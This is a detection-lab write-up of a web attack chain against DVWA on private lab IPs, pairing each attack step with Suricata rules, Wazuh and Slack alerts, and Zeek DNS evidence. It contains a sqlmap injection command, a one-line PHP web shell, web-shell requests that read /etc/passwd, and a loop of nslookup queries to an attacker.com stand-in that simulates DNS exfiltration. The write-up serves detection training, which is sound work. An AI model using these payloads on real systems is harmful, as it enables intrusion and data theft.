\# Attack Chain 2 — Web Compromise \& DNS Exfiltration



\## Overview



This document walks through a web application attack campaign: from SQL injection to web shell deployment, remote code execution, and finally data exfiltration via DNS tunneling. The victim runs DVWA (Damn Vulnerable Web Application) on Apache.



\*\*Attacker:\*\* 10.10.1.130 (Kali Linux)  

\*\*Victim:\*\* 10.10.1.133 (Ubuntu Desktop + Apache + DVWA)  

\*\*Detection Stack:\*\* Suricata on Sensor (10.10.1.132) + Wazuh Agent on Victim



\---



\## Kill Chain Overview



```

\[Kali 10.10.1.130]

&#x20;      │

&#x20;      │  Step 1: SQL Injection (sqlmap)

&#x20;      ▼

\[Victim :80/dvwa]  ─────►  Suricata: SQL Injection (T1190)

&#x20;      │

&#x20;      │  Step 2: Web Shell Upload

&#x20;      ▼

\[Victim /uploads/]  ────►  Suricata: Web Shell Upload (T1505.003)

&#x20;      │

&#x20;      │  Step 3: Remote Code Execution

&#x20;      ▼

\[Victim shell.php?cmd=]  ►  Suricata: Web Shell RCE (T1059)

&#x20;      │

&#x20;      │  Step 4: DNS Exfiltration (via web shell)

&#x20;      ▼

\[Victim DNS queries]  ──►  Suricata: DNS Exfiltration (T1071.004)

```



\---



\## Step 1 — Initial Access: SQL Injection



\*\*MITRE Technique:\*\* T1190 — Exploit Public-Facing Application  

\*\*Detection:\*\* Suricata rule 100004  

\*\*Tool:\*\* sqlmap



\### Command



```bash

sqlmap -u "http://10.10.1.133/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

&#x20; --cookie="PHPSESSID=<your-session-id>; security=low" \\

&#x20; --dbs --batch

```



!\[Step 1 - Attack](screenshots/chain2-step1-attack.png)



\### Result



```

available databases:

\[\*] dvwa

\[\*] information\_schema

```



!\[Step 1 - Attack Result](screenshots/chain2-step1-attack-result.png)



\### How Detection Works



Suricata inspects HTTP request payloads. When it sees keywords `UNION` and `SELECT` together in the same request body (case-insensitive), rule 100004 fires — a classic signature for SQL injection attempts.



```

alert http any any -> $HOME\_NET 80 (

&#x20; msg:"EXPLOIT SQL Injection Attempt";

&#x20; flow:to\_server,established;

&#x20; content:"UNION"; nocase;

&#x20; content:"SELECT"; nocase;

&#x20; classtype:web-application-attack;

&#x20; sid:1000004;

)

```



\### Alert Evidence



\*\*Suricata fast.log:\*\*



!\[Step 1 - Suricata Log](screenshots/chain2-step1-suricata-log.png)



\*\*Wazuh Dashboard:\*\*



!\[Step 1 - SQL Injection Alert](screenshots/chain2-step1-sqli.png)



\*\*Slack Notification:\*\*



!\[Step 1 - Slack Alert](screenshots/chain2-step1-slack.png)



\---



\## Step 2 — Persistence: Web Shell Upload



\*\*MITRE Technique:\*\* T1505.003 — Server Software Component: Web Shell  

\*\*Detection:\*\* Suricata rule 100005  



\### Setup



Create a minimal PHP web shell on Kali:



```bash

echo '<?php system($\_GET\["cmd"]); ?>' > /tmp/shell.php

```



!\[Step 2 - Create Shell](screenshots/chain2-step2-create-shell.png)



\### Upload



Navigate to DVWA → \*\*File Upload\*\* → upload `/tmp/shell.php` → click Upload.



```

../../hackable/uploads/shell.php succesfully uploaded!

```



!\[Step 2 - Upload DVWA](screenshots/chain2-step2-upload-dvwa.png)



\### How Detection Works



Suricata inspects HTTP POST requests. When a POST request contains both `.php` and `cmd` in the body (typical web shell payload pattern), rule 100005 fires.



```

alert http any any -> $HOME\_NET 80 (

&#x20; msg:"EXPLOIT Web Shell Upload Attempt";

&#x20; flow:to\_server,established;

&#x20; content:"POST"; http\_method;

&#x20; content:".php";

&#x20; content:"cmd";

&#x20; classtype:web-application-attack;

&#x20; sid:1000005;

)

```



\### Alert Evidence



\*\*Suricata fast.log:\*\*



!\[Step 2 - Suricata Log](screenshots/chain2-step2-suricata-log.png)



\*\*Wazuh Dashboard:\*\*



!\[Step 2 - Web Shell Upload Alert](screenshots/chain2-step2-webshell-upload.png)



\*\*Slack Notification:\*\*



!\[Step 2 - Slack Alert](screenshots/chain2-step2-slack.png)



\---



\## Step 3 — Execution: Remote Code Execution



\*\*MITRE Technique:\*\* T1059 — Command and Scripting Interpreter  

\*\*Detection:\*\* Suricata rule 100006  



\### Command



Access the uploaded web shell via browser or curl:



```

http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=id



http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=whoami



http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=uname+-a



http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd

```



\### Result



!\[Step 3 - Result1](screenshots/chain2-step3-result1.png)



</br>



!\[Step 3 - Result2](screenshots/chain2-step3-result2.png)



</br>



!\[Step 3 - Result3](screenshots/chain2-step3-result3.png)



</br>



!\[Step 3 - Result4](screenshots/chain2-step3-result4.png)



The web server is now executing arbitrary OS commands as `www-data`.



\### How Detection Works



Suricata inspects HTTP GET requests. When a GET request targets a `.php` file and contains `cmd=` in the query string, rule 100006 fires — the classic indicator of web shell command execution.



```

alert http any any -> $HOME\_NET 80 (

&#x20; msg:"EXPLOIT Web Shell Command Execution";

&#x20; flow:to\_server,established;

&#x20; content:"GET"; http\_method;

&#x20; content:".php";

&#x20; content:"cmd=";

&#x20; classtype:web-application-attack;

&#x20; sid:1000006;

)

```



\### Alert Evidence



\*\*Suricata fast.log:\*\*



!\[Step 3 - Suricata Log](screenshots/chain2-step3-suricata-log.png)



\*\*Wazuh Dashboard:\*\*



!\[Step 3 - RCE Alert](screenshots/chain2-step3-rce.png)



\*\*Slack Notification:\*\*



!\[Step 3 - Slack Alert](screenshots/chain2-step3-slack.png)



\---



\## Step 4 — Exfiltration: DNS Tunneling



\*\*MITRE Technique:\*\* T1071.004 — Application Layer Protocol: DNS  

\*\*Detection:\*\* Suricata rule 100007  



\### Command (via web shell)



The attacker uses RCE on the Victim to trigger DNS queries — encoding stolen data as subdomains sent to an attacker-controlled DNS server.



```

http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=for+i+in+$(seq+1+50);+do+nslookup+secret$i.attacker.com+10.10.1.131;+done

```



!\[Step 4 - Attack](screenshots/chain2-step4-attack.png)



This causes the \*\*Victim machine\*\* (10.10.1.133) to send 50 DNS queries in rapid succession — simulating data exfiltration encoded in DNS subdomain names.



\### How Detection Works



Suricata tracks DNS query volume per source IP. When a single host sends more than 30 DNS queries within 60 seconds, rule 100007 fires. The key indicator here is that the \*\*source is the Victim\*\* (10.10.1.133), not the attacker — confirming the machine has been compromised and is actively beaconing out.



```

alert dns any any -> any 53 (

&#x20; msg:"EXFIL DNS Exfiltration Attempt - High Query Volume";

&#x20; threshold:type both, track by\_src, count 30, seconds 60;

&#x20; classtype:policy-violation;

&#x20; sid:1000007;

)

```



\### Alert Evidence



\*\*Suricata fast.log:\*\*



!\[Step 4 - Suricata Log](screenshots/chain2-step4-suricata-log.png)



Note: Source IP is `10.10.1.133` (Victim) — the compromised machine is exfiltrating, not the attacker directly.



\*\*Wazuh Dashboard:\*\*



!\[Step 4 - DNS Exfil Alert](screenshots/chain2-step4-dns-exfil.png)



\*\*Slack Notification:\*\*



!\[Step 4 - Slack Alert](screenshots/chain2-step4-slack.png)



\---



\## Cross-Layer Correlation



The power of this chain is visible when you look at the \*\*source IPs across the timeline\*\*:



| Time | Alert | Source IP | Meaning |

|------|-------|-----------|---------|

| T+0 | SQL Injection | 10.10.1.130 | Attacker probing the app |

| T+4m | Web Shell Upload | 10.10.1.130 | Attacker deploying implant |

| T+5m | Web Shell RCE | 10.10.1.130 | Attacker executing commands |

| T+31m | DNS Exfiltration | \*\*10.10.1.133\*\* | \*\*Victim\*\* is now the threat actor |



The shift in source IP from `10.10.1.130` to `10.10.1.133` is the critical indicator — the victim machine has been weaponized. This is the kind of pattern a Tier-2 SOC analyst looks for during threat hunting.



\---



\## Zeek Evidence



Zeek's `dns.log` provides additional context that Suricata's alert alone doesn't capture — the actual domain names being queried:



```

\#fields  ts          uid         id.orig\_h    query                    qtype\_name

&#x20;        CxYz123     10.10.1.133  secret1.attacker.com   A

&#x20;        CxYz124     10.10.1.133  secret2.attacker.com   A

&#x20;        CxYz125     10.10.1.133  secret3.attacker.com   A

...

&#x20;        CxYz152     10.10.1.133  secret30.attacker.com  A

...

```



The sequential subdomain pattern (`secret1`, `secret2`, `secret3`...) is a textbook DNS exfiltration indicator — data chunks encoded as subdomains.



!\[Zeek DNS Log](screenshots/chain2-zeek-dns-log.png)



\---



\## Real-World Reference



This attack chain mirrors the \*\*HAFNIUM Exchange Server campaign (2021)\*\* where threat actors exploited public-facing web applications, deployed web shells (China Chopper), and used DNS-based C2 for persistent access and data exfiltration. The technique is also documented in the \*\*OWASP Web Shell Guide\*\* and observed across multiple APT groups including OilRig/APT34.



\*\*Related CVE:\*\* CVE-2021-26855 (ProxyLogon) — Exchange Server RCE that enabled mass web shell deployment using the same T1505.003 technique simulated in this lab.

